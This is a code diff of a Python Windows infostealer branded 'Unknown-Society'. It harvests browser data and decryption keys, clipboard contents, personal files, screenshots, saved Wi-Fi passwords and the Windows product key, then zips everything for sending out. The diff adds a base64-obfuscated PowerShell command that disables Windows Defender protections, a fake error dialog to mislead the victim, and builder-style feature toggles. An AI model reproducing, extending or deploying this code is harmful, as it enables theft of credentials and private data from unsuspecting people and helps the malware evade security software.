@@ -2,83 +2,15 @@ from PIL import ImageGrab
 from datetime import timezone, datetime, timedelta
 from win32crypt import CryptUnprotectData
 from datetime import datetime
+import Cryptodome
 from Cryptodome.Cipher import AES
 from win32com.client import GetObject
-import shutil,subprocess,os,psutil,GPUtil,string,random
+import shutil,subprocess,os,psutil,GPUtil,string,random,ctypes
 import threading,platform,win32api,time,zipfile,requests
 import json,base64,sqlite3,socket
+import winreg
 
 
-appdata = os.getenv('LOCALAPPDATA')
-
-
-
-browsers = {
-    'C:\\win_ord\\Browsers\\Amigo': appdata + '\\Amigo\\User Data',
-    'C:\\win_ord\\Browsers\\Torch': appdata + '\\Torch\\User Data',
-    'C:\\win_ord\\Browsers\\Kometa': appdata + '\\Kometa\\User Data',
-    'C:\\win_ord\\Browsers\\Orbitum': appdata + '\\Orbitum\\User Data',
-    'C:\\win_ord\\Browsers\\Cent-browser': appdata + '\\CentBrowser\\User Data',
-    'C:\\win_ord\\Browsers\\7star': appdata + '\\7Star\\7Star\\User Data',
-    'C:\\win_ord\\Browsers\\sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
-    'C:\\win_ord\\Browsers\\vivaldi': appdata + '\\Vivaldi\\User Data',
-    'C:\\win_ord\\Browsers\\chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
-    'C:\\win_ord\\Browsers\\chrome': appdata + '\\Google\\Chrome\\User Data',
-    'C:\\win_ord\\Browsers\\epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
-    'C:\\win_ord\\Browsers\\microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
-    'C:\\win_ord\\Browsers\\uran': appdata + '\\uCozMedia\\Uran\\User Data',
-    'C:\\win_ord\\Browsers\\yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
-    'C:\\win_ord\\Browsers\\brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
-    'C:\\win_ord\\Browsers\\iridium': appdata + '\\Iridium\\User Data',
-}
-
-
-def makdirs():
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\chrome"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\amigo"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\microsoft-edge"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\torch"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\kometa"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\orbitum"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\cent-browser"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\7star"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\sputnik"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\vivaldi"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\chrome-sxs"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\epic-privacy-browser"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\uran"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\yandex"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\brave"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\iridium"), exist_ok=True)
-
-
-# def get_files():
-#     source_path = os.path.expanduser("~") + "\\"
-#     destination_path = "C:\\win_ord\\grabber"
-#     permissions = 0o777
-#     os.chmod(destination_path, permissions)
-#     folders_to_copy = ["Desktop", "Downloads", "Pictures", "Documents","Videos"]
-
-#     for folder in folders_to_copy:
-#         source_folder_path = os.path.join(source_path, folder)
-#         destination_folder_path = os.path.join(destination_path, folder)
-#         os.makedirs(destination_folder_path, exist_ok=True)
-
-#         for root, dirs, files in os.walk(source_folder_path):
-#             dirs[:] = [d for d in dirs if os.path.join(root, d) not in os.listdir(destination_folder_path)]
-#             destination_subfolder_path = None
-#             for name in dirs:
-#                 source_subfolder_path = os.path.join(root, name)
-#                 destination_subfolder_path = os.path.join(destination_folder_path, os.path.relpath(source_subfolder_path, source_folder_path))
-#                 if not os.path.exists(destination_subfolder_path):
-#                     os.makedirs(destination_subfolder_path)
-#             for name in files:
-#                 source_file_path = os.path.join(root, name)
-#                 if os.path.getsize(source_file_path) <= 2048576: # 1 MB = 1048576 bytes
-#                     if destination_subfolder_path is None:
-#                         destination_subfolder_path = os.path.join(destination_folder_path, os.path.relpath(root, source_folder_path))
-#                     destination_file_path = os.path.join(destination_subfolder_path, name)
-#                     shutil.copy2(source_file_path, destination_file_path)
 
 def get_files():
     max_size = 2 * 1024 * 1024
@@ -247,6 +179,45 @@ def get_telegram():
 
 
 def get_browsers_details():
+    appdata = os.getenv('LOCALAPPDATA')
+    browsers = {
+        'C:\\win_ord\\Browsers\\Amigo': appdata + '\\Amigo\\User Data',
+        'C:\\win_ord\\Browsers\\Torch': appdata + '\\Torch\\User Data',
+        'C:\\win_ord\\Browsers\\Kometa': appdata + '\\Kometa\\User Data',
+        'C:\\win_ord\\Browsers\\Orbitum': appdata + '\\Orbitum\\User Data',
+        'C:\\win_ord\\Browsers\\Cent-browser': appdata + '\\CentBrowser\\User Data',
+        'C:\\win_ord\\Browsers\\7star': appdata + '\\7Star\\7Star\\User Data',
+        'C:\\win_ord\\Browsers\\sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+        'C:\\win_ord\\Browsers\\vivaldi': appdata + '\\Vivaldi\\User Data',
+        'C:\\win_ord\\Browsers\\chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
+        'C:\\win_ord\\Browsers\\chrome': appdata + '\\Google\\Chrome\\User Data',
+        'C:\\win_ord\\Browsers\\epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+        'C:\\win_ord\\Browsers\\microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+        'C:\\win_ord\\Browsers\\uran': appdata + '\\uCozMedia\\Uran\\User Data',
+        'C:\\win_ord\\Browsers\\yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+        'C:\\win_ord\\Browsers\\brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+        'C:\\win_ord\\Browsers\\iridium': appdata + '\\Iridium\\User Data',
+    }
+
+
+
+    def makdirs():
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\chrome"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\amigo"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\microsoft-edge"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\torch"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\kometa"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\orbitum"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\cent-browser"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\7star"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\sputnik"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\vivaldi"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\chrome-sxs"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\epic-privacy-browser"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\uran"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\yandex"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\brave"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\iridium"), exist_ok=True)
     def get_master_key(path: str):
         try:
             if not os.path.exists(path):
@@ -489,6 +460,42 @@ def get_rdp():
         f.write(build)
 	
 
+def get_wifi():
+    destination_path = "C:\\win_ord\\wifi_info\\"+f"{os.getlogin()}_wifi.txt"
+    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+    wifi_profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+    wifi_profiles = [line.split(':')[1][1:-1] for line in wifi_profiles if "All User Profile" in line]
+    for profile in wifi_profiles:
+        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8').split('\n')
+        results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]
+        build = f"========================= [Unknown-Society] ============================f'Wi-Fi Profile: {profile}, Password: {results[0]}'\n========================= [Unknown-Society] ============================"
+        with open(destination_path,"a") as f:
+            f.write(build)
+
+def get_productkey():
+    destination_path = "C:\\win_ord\\product_key\\"+f"{os.getlogin()}_product_key.txt"
+    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
+    value, _ = winreg.QueryValueEx(key, "DigitalProductId")
+    product_key = ''.join([hex(x)[2:].zfill(2) for x in value[52:67]]) # Decode the product key from binary to ASCII
+    build=("Product key:", product_key)
+    with open(destination_path,"a") as f:
+            f.write(str(build))
+
+
+def disable_defender():
+    try: 
+        cmd = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode() 
+        subprocess.run(cmd, shell=True, capture_output=True)
+    except:
+        pass
+
+
+def get_fakeerror(): 
+    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
+
+
+
 def generate_random_string(n):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
 
@@ -519,19 +526,45 @@ def zip_and_send_out():
         shutil.rmtree(r"C:\\win_ord")
         shutil.rmtree(r"C:\\windll")
     except:
-        os.remove(zip_path)
-        shutil.rmtree(r"C:\\win_ord")
-        shutil.rmtree(r"C:\\windll")
+        try:
+            os.remove(zip_path)
+            shutil.rmtree(r"C:\\win_ord")
+            shutil.rmtree(r"C:\\windll")
+        except:
+            pass
 
 
 
 def main():
+    check_browser = "browser_id"
+    check_clipb = "clipb_id"
+    check_files ="file_id"
+    check_screen = "screen_id"
+    check_product="product_id"
+    check_sysinfo = "system_id"
+    check_wifi = "wifi_id"
+    check_fakeerror = "error_id"
+    
     if __name__ == "__main__":
-        get_browsers_details()
-        get_clipb_data()
-        get_files()
-        get_screenshot()
-
+        if check_browser == "on":
+            get_browsers_details()
+        if check_clipb == "on":
+            get_clipb_data()
+        if check_files == "on":
+            get_files()
+        if check_screen == "on":
+            get_screenshot()
+        if check_product == "on":
+            get_productkey()
+        if check_sysinfo == "on":
+            get_systeminfo()
+        if check_wifi == "on":
+            get_wifi()
         zip_and_send_out()
+        if check_fakeerror == "on":
+            get_fakeerror()
+        
+        # 
+
     
 main()
